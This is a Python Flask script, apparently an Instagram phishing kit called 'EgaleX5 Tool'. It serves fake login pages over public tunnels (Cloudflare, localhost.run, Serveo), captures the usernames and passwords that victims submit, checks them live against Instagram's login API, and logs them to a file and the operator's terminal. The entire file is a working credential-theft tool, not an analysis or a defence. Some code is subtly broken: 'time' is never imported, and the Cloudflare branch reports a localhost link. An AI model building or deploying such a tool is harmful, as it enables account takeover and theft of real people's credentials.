import os
import shutil 
import socket
import subprocess
import signal
import logging
import requests
from flask import Flask, render_template, request, jsonify

# Terminal Setup (Auto-adjusted to terminal size)
os.system("clear")

try:
    term_width = shutil.get_terminal_size().columns
except:
    term_width = 40  # Safe fallback if terminal size can't be detected

print("=" * term_width)
print("Welcome to EgaleX5 Tool".center(term_width))
print("=" * term_width)
# Color Codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Global Variables
PORT = None
TUNNEL_CHOICE = None
TUNNEL_LINK = "Not Found"
USERNAME = "N/A"
PASSWORD = "N/A"
RESULT = "N/A"

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def find_free_port():
    global PORT
    for port in range(8080, 8090):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) != 0:
                PORT = port
                return
    print(f"{RED}❌ No free port found.{RESET}")
    exit()

def tunnel_selection():
    global TUNNEL_CHOICE
    print(f"\n{YELLOW}🔹 Select Tunnel Option:{RESET}")
    print(f"{GREEN}1️⃣ Cloudflare")
    print("2️⃣ SSH Tunnel")
    print(f"3️⃣ Serveo{RESET}")
    TUNNEL_CHOICE = input(f"\n{BLUE}[+] Enter Option (1-3): {RESET}")

def start_tunnel():
    global TUNNEL_LINK
    if TUNNEL_CHOICE == "1":
        print(f"{GREEN}🔹 Starting Cloudflare Tunnel...{RESET}")
        os.system(f"cloudflared tunnel --url http://localhost:{PORT} &> /dev/null &")
        time.sleep(3)
        TUNNEL_LINK = f"http://localhost:{PORT}"
        print(f"{GREEN}✅ Cloudflare Tunnel Link: {TUNNEL_LINK}{RESET}")
    elif TUNNEL_CHOICE == "2":
        print(f"{GREEN}🔹 Starting SSH Tunnel...{RESET}")
        ssh_cmd = f"ssh -i ~/.ssh/id_rsa -R 80:localhost:{PORT} ssh.localhost.run"
        process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip()
            if "https://" in line:
                TUNNEL_LINK = line.split()[-1]
                print(f"{GREEN}🔗 SSH Tunnel Link: {TUNNEL_LINK}{RESET}")
                break
    elif TUNNEL_CHOICE == "3":
        print(f"{GREEN}🔹 Starting Serveo Tunnel...{RESET}")
        serveo_cmd = f"ssh -R 80:localhost:{PORT} serveo.net"
        process = subprocess.Popen(serveo_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip()
            if "https://" in line:
                TUNNEL_LINK = line.split()[-1]
                print(f"{GREEN}🔗 Serveo Tunnel Link: {TUNNEL_LINK}{RESET}")
                break
    else:
        print(f"{RED}❌ Invalid Choice! Exiting...{RESET}")
        exit()

def check_instagram_login(username, password):
    global RESULT
    url = "https://www.instagram.com/api/v1/accounts/login/"
    headers = {"User-Agent": "Instagram 123.0.0.26.121 Android", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": username, "password": password, "_csrftoken": "missing", "device_id": "random_device_id", "login_attempt_count": "0"}
    session = requests.Session()
    response = session.post(url, headers=headers, data=data)
    if "logged_in_user" in response.text:
        RESULT = "success"
    elif "challenge_required" in response.text:
        RESULT = "otp"
    else:
        RESULT = "fail"

app = Flask(__name__, static_folder="static", template_folder="templates")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/hs')
def hs_page():
    return render_template('hs.html')

@app.route('/submit', methods=['POST'])
def submit():
    global USERNAME, PASSWORD
    data = request.json
    USERNAME = data.get("username", "N/A")
    PASSWORD = data.get("password", "N/A")

    check_instagram_login(USERNAME, PASSWORD)

    # Save log
    with open("log.txt", "a") as file:
        file.write(f"Username: {USERNAME} | Password: {PASSWORD} | Status: {RESULT}\n")

    if RESULT == "success":
        msg = "Login successful!"
    elif RESULT == "otp":
        msg = "OTP required. Login partially successful."
    else:
        msg = "Incorrect password."

    # Correct order of terminal print
	# Correct order of terminal print with color logic
    print(f"{BLUE}[INFO] Username: {YELLOW}{USERNAME}{RESET}")
    print(f"{BLUE}[INFO] Password: {YELLOW}{PASSWORD}{RESET}")
    
    if RESULT == "fail":
        print(f"{RED}[SERVER RESPONSE] {msg}{RESET}")
    else:
        print(f"{GREEN}[SERVER RESPONSE] {msg}{RESET}")
    return jsonify({
        "success": RESULT != "fail",
        "status": RESULT,
        "message": msg
    })

def signal_handler(sig, frame):
    print(f"\n{RED}❌ Process Stopped! Exiting Safely...{RESET}")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    find_free_port()
    tunnel_selection()
    start_tunnel()
    print(f"\n{BLUE}🚀 Flask Server Running on Port: {YELLOW}{PORT}{RESET}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
